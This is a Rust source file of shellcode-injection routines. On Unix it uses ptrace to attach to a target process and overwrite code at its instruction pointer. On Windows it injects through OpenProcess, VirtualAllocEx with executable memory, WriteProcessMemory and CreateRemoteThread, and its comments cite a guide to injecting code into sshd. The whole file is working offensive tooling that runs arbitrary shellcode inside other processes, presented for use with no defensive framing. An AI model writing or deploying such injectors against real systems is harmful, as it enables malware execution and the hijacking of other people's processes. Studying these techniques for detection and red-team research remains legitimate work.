#[cfg(unix)]
use nix::unistd::*;
#[cfg(unix)]
use nix::sys::ptrace::{attach, getregs, setregs, write, detach, read};
#[cfg(unix)]
use nix::sys::wait::{wait, /*WaitStatus*/};
#[cfg(unix)]
use core::ffi::c_void;
#[cfg(unix)]
use libc::user_regs_struct;
//use std::ptr;
#[cfg(unix)]
use nix::sys::signal::Signal;

use std::io::Error;
use std::ptr;
use std::mem;


#[cfg(windows)]
use winapi;
#[cfg(windows)]
use winapi::shared::minwindef::{BOOL, DWORD, LPVOID, LPCVOID};
#[cfg(windows)]
use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread, PROCESS_INFORMATION, STARTUPINFOW};
#[cfg(windows)]
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
#[cfg(windows)]
use winapi::um::winbase::{DEBUG_PROCESS, DEBUG_ONLY_THIS_PROCESS, INFINITE, CREATE_UNICODE_ENVIRONMENT};
#[cfg(windows)]
use winapi::um::winnt::{HANDLE, PAGE_EXECUTE_READWRITE, MEM_RESERVE, MEM_COMMIT, PROCESS_ALL_ACCESS};
#[cfg(windows)]
use winapi::um::minwinbase::*;

#[cfg(unix)]
pub fn ptrace_inject(pid: i32, shellcode: Vec<u8>, len_shellcode: usize) -> std::io::Result<bool> {
    // http://actes.sstic.org/SSTIC06/Playing_with_ptrace/SSTIC06-article-Bareil-Playing_with_ptrace.pdf
    // https://sudonull.com/post/8186-Introduction-to-ptrace-or-code-injection-in-sshd-for-fun

    let mut success: bool = false;

    //println!("pid: {:#?}", pid);
    let pid: Pid = Pid::from_raw(pid);

    // attach to the process if ptrace has the right and save registers
    let mut regs = match attach(pid) {
        Ok(_r) => {
            let r = wait();
            match r {
                Ok(_) => {},
                Err(_) => {},
            }
            // save register
            getregs(pid).expect("cannot get regs")
        },
        Err(_e) => {
            //println!("{:#?}", e);
            let val: u64 = 0;
            user_regs_struct { r15: val, r14: val, r13: val, r12: val, rbp: val, rbx: val, r11: val, r10: val, r9: val, r8: val, rax: val, rcx: val, rdx: val, rsi: val, rdi: val, orig_rax: val, rip: val, cs: val, eflags: val, rsp: val, ss: val, fs_base: val, gs_base: val, ds: val, es: val, fs: val, gs: val }
        },
    };
    
    //println!("[*] Injecting at rip: {:#?}", regs.rip);

    // inject code
    let mut rip = regs.rip;
    let mut saved_bytes: Vec<u8> = Vec::new();
    
    for byte in 0..len_shellcode {
        let address = rip as *mut c_void;
        let sc_byte = shellcode[byte] as *mut c_void;
        unsafe {
            let v: u8 = match read(pid, address){
                Ok(r) => {r as u8},
                Err(_e) => {90 as u8},
            };
            saved_bytes.push(v);

            match write(pid, address, sc_byte) {
                Ok(_r) => {success = true},
                Err(_e) => {success = false},
            };
        }
        rip = rip + 1;
    }

    println!("{:#?}", saved_bytes);

    // restaure reg that has not been modified ... well
    regs.rip = regs.rip + 2; // because cont or detach will decrement rip by 2
    let r = setregs(pid, regs);
    match r {
        Ok(_) => {},
        Err(_) => {},
    }

    // continue the process
    //cont(pid, Signal::SIGCONT);

    // detach an so continue the execution of the process
    let r= detach(pid, Signal::SIGCONT);

    match r {
        Ok(_) => {},
        Err(_) => {},
    }


    Ok(success)
}

#[cfg(windows)]
pub fn open_process(pid: u32) -> Result<HANDLE, Error> {
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
    let ret = unsafe {
        OpenProcess(
            PROCESS_ALL_ACCESS,
            0,
            pid
        )
    };

    println!("process handle: {:#?}", ret);
    Ok(ret)
}

#[cfg(windows)]
pub fn virtual_alloc(process_handle: HANDLE, size_shellcode: usize) -> Result<LPVOID, Error> {
    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    let ret = unsafe {
        VirtualAllocEx(
            process_handle,
            ptr::null_mut(),
            size_shellcode,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        )
    };

    println!("memory allocation: {:#?}", ret);
    Ok(ret)
}

#[cfg(windows)]
pub fn write_process_memory(process_handle: HANDLE, mem_addr: LPVOID, shellcode: Vec<u8>, size_shellcode: usize) -> Result<BOOL, Error> {
    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

    let ret = unsafe {
        WriteProcessMemory(
            process_handle,
            mem_addr,
            shellcode.as_ptr() as LPCVOID,
            size_shellcode,
            ptr::null_mut()
        )
    };

    println!("write process memory: {:#?}", ret);
    Ok(ret)
}

#[cfg(windows)]
pub fn create_remote_thread(process_handle: HANDLE, mem_addr: LPVOID) -> Result<HANDLE, Error> {
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread

    let ret = unsafe {
        CreateRemoteThread(
            process_handle,
            ptr::null_mut(),
            0,
            Some(mem::transmute(mem_addr)),
            ptr::null_mut(),
            0,
            ptr::null_mut()
        )
    };

    println!("remote thread handle: {:#?}", ret);
    Ok(ret)
}

#[cfg(windows)]
pub fn remote_inject(pid: u32, shellcode: Vec<u8>, len_shellcode: usize) -> std::io::Result<bool> {
    // openProcess
    let process_handle: HANDLE = open_process(pid).unwrap();

    // virtualAllocEx
    let mem_addr: LPVOID = virtual_alloc(process_handle, len_shellcode).unwrap();

    // writeProcessMemory
    write_process_memory(process_handle, mem_addr, shellcode, len_shellcode);

    // createRemoteThread
    create_remote_thread(process_handle, mem_addr);

    let success: bool = false;
    Ok(success)
}